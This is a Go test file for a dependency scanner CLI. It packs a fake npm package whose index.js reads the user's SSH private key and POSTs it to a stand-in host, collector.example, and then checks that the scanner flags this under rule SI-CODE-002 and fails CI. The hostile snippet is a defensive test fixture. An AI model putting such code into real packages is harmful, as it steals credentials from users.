package cli

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// trojanProject: a dependency with no install script whose index.js reads an
// SSH key next to a network send (never imported, so it never runs), plus a
// clean one.
func trojanProject(t *testing.T) {
	t.Helper()
	if _, err := exec.LookPath("npm"); err != nil {
		t.Skip("npm not installed")
	}
	root := t.TempDir()
	proj := filepath.Join(root, "proj")
	mustMkdir(t, proj)
	deps := map[string]string{}
	for name, code := range map[string]string{
		"trojan-dep": `const k = require('fs').readFileSync(require('os').homedir() + '/.ssh/id_rsa', 'utf8');
fetch('https://collector.example/k', { method: 'POST', body: k });`,
		"clean-dep": `module.exports = (a, b) => a + b;`,
	} {
		src := filepath.Join(root, name)
		mustMkdir(t, src)
		mustWriteJSON(t, filepath.Join(src, "package.json"), map[string]any{"name": name, "version": "1.0.0", "main": "index.js"})
		if err := os.WriteFile(filepath.Join(src, "index.js"), []byte(code), 0o600); err != nil {
			t.Fatal(err)
		}
		pack := exec.Command("npm", "pack", "--silent", "--pack-destination", proj)
		pack.Dir = src
		if out, err := pack.CombinedOutput(); err != nil {
			t.Fatalf("npm pack: %v\n%s", err, out)
		}
		deps[name] = "file:./" + name + "-1.0.0.tgz"
	}
	mustWriteJSON(t, filepath.Join(proj, "package.json"), map[string]any{"name": "proj", "version": "1.0.0", "dependencies": deps})
	fixtures := filepath.Join(root, "registry.json")
	if err := os.WriteFile(fixtures, []byte("{}"), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv("SAFE_INSTALL_REGISTRY_FIXTURES", fixtures)
	t.Setenv("SAFE_INSTALL_CONFIG_DIR", filepath.Join(root, "config"))
	t.Setenv("SAFE_INSTALL_CACHE_DIR", filepath.Join(root, "cache"))
	t.Chdir(proj)
}

func TestInstallReportsCodeFindings(t *testing.T) {
	trojanProject(t)
	out, err := runInstallCLI(t, "", false)
	if err != nil {
		t.Fatalf("install: %v\n%s", err, out)
	}
	for _, want := range []string{"trojan-dep@1.0.0", "SI-CODE-002", "index.js reads credentials next to a network send"} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q:\n%s", want, out)
		}
	}
	if strings.Contains(out, "clean-dep@1.0.0  risk") {
		t.Errorf("clean package reported:\n%s", out)
	}
}

func TestInstallCIFailsOnCodeFindings(t *testing.T) {
	trojanProject(t)
	if _, err := runInstallCLI(t, "", false, "--ci"); exitCode(err) != ExitPolicyFailure {
		t.Fatalf("exit = %d (%v), want %d", exitCode(err), err, ExitPolicyFailure)
	}
}

func TestScanCommand(t *testing.T) {
	trojanProject(t)
	if out, err := runInstallCLI(t, "", false); err != nil {
		t.Fatalf("install: %v\n%s", err, out)
	}
	out, err := runCLIOut(t, "scan", "--format", "json")
	if exitCode(err) != ExitPolicyFailure {
		t.Fatalf("scan exit = %d (%v)\n%s", exitCode(err), err, out)
	}
	var rep struct {
		Packages []struct {
			ID       string `json:"id"`
			Findings []struct {
				Rule string `json:"rule"`
			} `json:"findings"`
		} `json:"packages"`
	}
	if err := json.Unmarshal([]byte(out), &rep); err != nil {
		t.Fatalf("json: %v\n%s", err, out)
	}
	flagged := map[string]string{}
	for _, p := range rep.Packages {
		for _, f := range p.Findings {
			flagged[p.ID] = f.Rule
		}
	}
	if flagged["trojan-dep@1.0.0"] != "SI-CODE-002" || flagged["clean-dep@1.0.0"] != "" {
		t.Fatalf("flagged = %v", flagged)
	}
	if _, err := runCLIOut(t, "scan", "--fail-on", "none"); err != nil {
		t.Fatalf("--fail-on none: %v", err)
	}
}
